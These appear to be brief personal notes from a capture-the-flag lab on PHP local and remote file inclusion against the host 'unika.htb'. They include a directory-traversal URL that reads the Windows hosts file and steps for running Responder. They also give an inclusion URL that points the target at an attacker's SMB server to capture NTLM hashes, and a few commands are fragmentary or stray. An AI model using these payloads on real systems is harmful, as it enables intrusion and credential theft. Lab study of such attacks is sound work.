## File Inclusion Web
What is it?

```html
File 1 --> vars.php
<?php
$color = 'green';
$fruit = 'apple';
?>
#############################################
File 2 --> test.php
<?php
 echo "A $color $fruit"; // output = "A"
include 'vars.php';
echo "A $color $fruit"; // output = "A green apple"
?>
```

if there is a path variable try to inject something for example:

```
http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
```


In the PHP configuration file php.ini , "allow_url_include" wrapper is set to "Off" by default, indicating that
PHP does not load remote HTTP or FTP URLs to prevent remote file inclusion attacks. However, even if
allow_url_include and allow_url_fopen are set to "Off", PHP will not prevent the loading of SMB URLs.
In our case, we can misuse this functionality to steal the NTLM hash


What can be done if windows server: 

### SMB

```sh
~cat
```
Verify that the Responder.conf is set to listen for SMB requests.

edit resolver conf if necessary
```sh
cat Responder.conf


sudo python3 Responder.py -I tun0
```

With the SMB server running, we can now try to include the file from the server


```sh
http://unika.htb/?page=//<yourIP>/somefile

http://unika.htb/?page=//10.10.15.71/somefile


export PATH=~/bin:$PATH
```